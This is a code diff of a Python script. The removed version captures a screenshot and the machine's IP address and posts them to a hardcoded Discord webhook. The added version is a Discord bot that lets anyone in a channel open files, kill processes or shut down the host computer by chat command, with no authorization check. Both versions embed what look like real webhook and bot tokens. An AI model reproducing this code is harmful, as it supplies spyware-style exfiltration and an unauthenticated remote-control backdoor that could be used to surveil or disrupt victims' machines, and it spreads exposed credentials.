@@ -1,61 +1,61 @@
+import discord
+import subprocess
 import os
-import requests
-from PIL import ImageGrab
-import socket
+from dotenv import load_dotenv
 
-# Define the webhook URL
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1245013270088253473/PrDXaeWwmrAeLpbfa_nsBP_4r3-T4lCg6S1w4zEkHq_-E3QqICRbdhJQr0N3IjNsS0xy'
+# Load environment variables
+load_dotenv()
+TOKEN = os.getenv('MTI0NTAxMTgzNTgyOTM1NDU0Nw.G87-w3.7sQQfDH-AC0DUy4JaET_IFVAomBLExEs7LqjNQ')
 
-def capture_screenshot(filename):
-    """Capture a screenshot and save it to a file."""
-    screenshot = ImageGrab.grab()
-    screenshot.save(filename)
+# Set up the bot client
+intents = discord.Intents.default()
+intents.message_content = True
+client = discord.Client(intents=intents)
 
-def get_ip_address():
-    """Get the local IP address of the machine."""
-    try:
-        hostname = socket.gethostname()
-        ip_address = socket.gethostbyname(hostname)
-        return ip_address
-    except Exception as e:
-        return str(e)
+@client.event
+async def on_ready():
+    print(f'Logged in as {client.user}')
 
-def send_to_webhook(image_path, ip_address):
-    """Send the screenshot and IP address to the Discord webhook."""
-    with open(image_path, 'rb') as image_file:
-        image_data = image_file.read()
-    
-    # Send the screenshot
-    files = {'file': ('screenshot.png', image_data, 'image/png')}
-    response = requests.post(WEBHOOK_URL, files=files)
-    
-    # Send the IP address as a message
-    payload = {
-        'content': f"IP Address: {ip_address}"
-    }
-    response = requests.post(WEBHOOK_URL, json=payload)
+@client.event
+async def on_message(message):
+    if message.author == client.user:
+        return
 
-    if response.status_code == 204:
-        print("Successfully sent to webhook.")
-    else:
-        print(f"Failed to send to webhook. Status code: {response.status_code}")
+    # Commands should start with the '!' prefix
+    if message.content.startswith('!'):
+        command = message.content[1:]  # Remove '!' from the command
+        
+        if command.startswith('open '):
+            file_to_open = command[len('open '):]
+            try:
+                if os.name == 'nt':
+                    os.startfile(file_to_open)  # Windows-specific
+                else:
+                    subprocess.Popen(['xdg-open', file_to_open])  # Linux-specific
+                await message.channel.send(f'Opened: {file_to_open}')
+            except Exception as e:
+                await message.channel.send(f'Failed to open file: {e}')
 
-def main():
-    # Define the screenshot file path
-    screenshot_path = 'screenshot.png'
-    
-    # Capture the screenshot
-    capture_screenshot(screenshot_path)
-    
-    # Get the IP address
-    ip_address = get_ip_address()
-    
-    # Send screenshot and IP address to webhook
-    send_to_webhook(screenshot_path, ip_address)
-    
-    # Clean up
-    os.remove(screenshot_path)
+        elif command.startswith('close '):
+            process_name = command[len('close '):]
+            try:
+                if os.name == 'nt':
+                    subprocess.run(['taskkill', '/IM', process_name, '/F'])
+                else:
+                    subprocess.run(['pkill', process_name])
+                await message.channel.send(f'Closed process: {process_name}')
+            except Exception as e:
+                await message.channel.send(f'Failed to close process: {e}')
 
-if __name__ == '__main__':
-    main()
+        elif command == 'shutdown':
+            try:
+                if os.name == 'nt':
+                    subprocess.run(['shutdown', '/s', '/t', '0'])
+                else:
+                    subprocess.run(['shutdown', 'now'])
+                await message.channel.send('Shutting down...')
+            except Exception as e:
+                await message.channel.send(f'Failed to shut down: {e}')
 
+# Run the bot
+client.run(TOKEN)
